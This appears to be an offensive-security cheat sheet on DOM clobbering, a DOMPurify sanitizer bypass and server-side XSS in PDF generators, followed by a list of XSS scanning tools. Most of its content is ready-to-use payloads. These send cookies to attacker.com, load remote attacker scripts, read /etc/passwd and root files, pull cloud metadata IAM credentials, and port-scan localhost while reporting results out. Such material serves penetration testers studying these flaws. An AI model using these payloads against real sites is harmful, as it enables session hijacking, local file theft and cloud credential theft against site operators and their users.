From: [https://portswigger.net/web-security/dom-based/denial-of-service](https://portswigger.net/web-security/dom-based/denial-of-service)

#### How

DOM-based denial-of-service vulnerabilities arise when a script passes **attacker-controllable data in an unsafe way to a problematic platform API**, such as an API whose invocation can cause the user's computer to consume **excessive amounts of CPU or disk space**. This may result in side effects if the browser restricts the functionality of the website, for example, by rejecting attempts to store data in `localStorage` or killing busy scripts.

#### Sinks

```
requestFileSystem()
RegExp()
```

## **DOM Clobbering**

A common pattern used by JavaScript developers is:

`var someObject = window.someObject || {};`

If you can control some of the HTML on the page, you can clobber the `someObject` reference with a DOM node, such as an anchor. Consider the following code:

```python
<script>
 window.onload = function(){
    let someObject = window.someObject || {};
    let script = document.createElement('script');
    script.src = someObject.url;
    document.body.appendChild(script);
 };
</script>
```

To exploit this vulnerable code, you could inject the following HTML to clobber the `someObject` reference with an anchor element:

`<a id=someObject><a id=someObject name=url href=//malicious-website.com/malicious.js>`

Injecting that data `window.someObject.url` is going to be `href=//malicious-website.com/malicious.js`

**Trick**: `DOMPurify` allows you to use the **`cid:`** protocol, which **does not URL-encode double-quotes**. This means you can **inject an encoded double-quote that will be decoded at runtime**. Therefore, injecting something like `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">` will make the HTML encoded `&quot;` to be **decoded on runtime** and **escape** from the attribute value to **create** the **`onerror`** event.

Another common technique consists on using **`form`** element. Some client-side libraries will go through the attributes of the created form element to sanitised it. But, if you **create an `input`**&#x69;nside the form with `id=attributes` , you will **clobber the attributes property** and the sanitizer **won't** be able to go through the **real attributes**.


# Server Side XSS (Dynamic PDF)

## Server Side XSS (Dynamic PDF)

If a web page is creating a PDF using user controlled input, you can try to **trick the bot** that is creating the PDF into **executing arbitrary JS code**.\
So, if the **PDF creator bot finds** some kind of **HTML** **tags**, it is going to **interpret** them, and you can **abuse** this behaviour to cause a **Server XSS**.

Please, notice that the `<script><\script>` tags don't work always, so you will need a different method to execute JS (for example, abusing `<img` ).\
Also, note that in a regular exploitation you will be **able to see/download the created pdf**, so you will be able to see everything you **write via JS** (using `document.write()` for example). But, if you **cannot see** the created PDF, you will probably need **extract the information making web request to you** (Blind).

## Payloads

### Discovery

```markup
<!-- Basic discovery, Write somthing-->
<img src="x" onerror="document.write('test')" />
<script>document.write(JSON.stringify(window.location))</script>
<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>

<!--Basic blind discovery, load a resource-->
<img src="http://attacker.com"/>
<img src=x onerror="location.href='http://attacker.com/?c='+ document.cookie">
<script>new Image().src="http://attacker.com/?c="+encodeURI(document.cookie);</script>
<link rel=attachment href="http://attacker.com">
```

### SVG

Any of the previous of following payloads may be used inside this SVG payload. One iframe accessing Burpcollab subdomain and another one accessing the metadata endpoint are put as examples.

```markup
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="root" width="800" height="500">
    <g>
        <foreignObject width="800" height="500">
            <body xmlns="http://www.w3.org/1999/xhtml">
                <iframe src="http://redacted.burpcollaborator.net" width="800" height="500"></iframe>
                <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
            </body>
        </foreignObject>
    </g>
</svg>
```

### Path disclosure

```markup
<!-- If the bot is accessing a file:// path, you will discover the internal path
if not, you will at least have wich path the bot is accessing -->
<img src="x" onerror="document.write(window.location)" />
<script> document.write(window.location) </script>
```

### Load an external script

The best conformable way to exploit this vulnerability is to abuse the vulnerability to make the bot load a script you control locally. Then, you will be able to change the payload locally and make the bot load it with the same code every time.

```markup
<script src="http://attacker.com/myscripts.js"></script>
<img src="xasdasdasd" onerror="document.write('<script src="https://attacker.com/test.js"></script>')"/>
```

### Read local file

```markup
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(btoa(this.responseText))};
x.open("GET","file:///etc/passwd");x.send();
</script>
```

```markup
<script>
    xhzeem = new XMLHttpRequest();
    xhzeem.open("GET","file:///etc/passwd");
    xhzeem.send();
    xhzeem.onload = function(){document.write(this.responseText);}
    xhzeem.onerror = function(){document.write('failed!')}
</script>
```

```markup
<iframe src=file:///etc/passwd></iframe>
<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<link rel=attachment href="file:///root/secret.txt">
<object data="file:///etc/passwd">
<portal src="file:///etc/passwd" id=portal>
```

### Get external web page response as attachment (metadata endpoints)

```markup
<link rel=attachment href="http://http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

### Bot delay

```markup
<!--Make the bot send a ping every 500ms to check how long does the bot wait-->
<script>
    let time = 500;
    setInterval(()=>{
        let img = document.createElement("img");
        img.src = `https://attacker.com/ping?time=${time}ms`;
        time += 500;
    }, 500);
</script>
<img src="https://attacker.com/delay">
```

### Port Scan

```markup
<!--Scan local port and receive a ping indicating which ones are found-->
<script>
const checkPort = (port) => {
    fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
        let img = document.createElement("img");
        img.src = `http://attacker.com/ping?port=${port}`;
    });
}

for(let i=0; i<1000; i++) {
    checkPort(i);
}
</script>
<img src="https://attacker.com/startingScan">
```

### [SSRF](../ssrf-server-side-request-forgery)

This vulnerability can be transformed very easily in a SSRF (as you can make the script load external resources). So just try to exploit it (read some metadata?).

## References

{% embed url="https://lbherrera.github.io/lab/h1415-ctf-writeup.html" %}

{% embed url="https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/" %}

{% embed url="https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html" %}



# XSS Tools

## XSStrike

```
git clone https://github.com/s0md3v/XSStrike.git
pip3 install -r XSStrike/requirements.txt
```

**Basic Usage(Get):**\
python3 xsstrike.py --headers -u "[http://localhost/vulnerabilities/xss\_r/?name=asd](http://localhost/vulnerabilities/xss_r/?name=asd)"\
**Basic Usage(Post):**\
python xsstrike.py -u "[http://example.com/search.php](http://example.com/search.php)" --data "q=query"\
**Crawling(depth=2 default):**\
python xsstrike.py -u "[http://example.com/page.php](http://example.com/page.php)" --crawl -l 3\
**Find hidden parameters:**\
python xsstrike.py -u "[http://example.com/page.php](http://example.com/page.php)" --params\
**Extra:**\
\--headers #Set custom headers (like cookies). It is necessary to set every time\
\--skip-poc\
\--skip-dom #Skip DOM XSS scanning

## BruteXSS

```
git clone https://github.com/rajeshmajumdar/BruteXSS
```

Tool to find vulnerable (GET or POST) parameter to XSS using a list of payloads with a GUI.\
Custom headers (like cookies) can not be configured.

## XSSer

[https://github.com/epsylon/xsser](https://github.com/epsylon/xsser)\
Already installed in Kali.\
Complete tool to find XSS.

**Basic Usage(Get):**

The tool doesnt send the payload:(

## XSSCrapy

```
git clone https://github.com/DanMcInerney/xsscrapy
```

Not recommended. A lot of unnecessary output, and it doesn\`t work properly.

## DalFOx

[https://github.com/hahwul/dalfox](https://github.com/hahwul/dalfox)
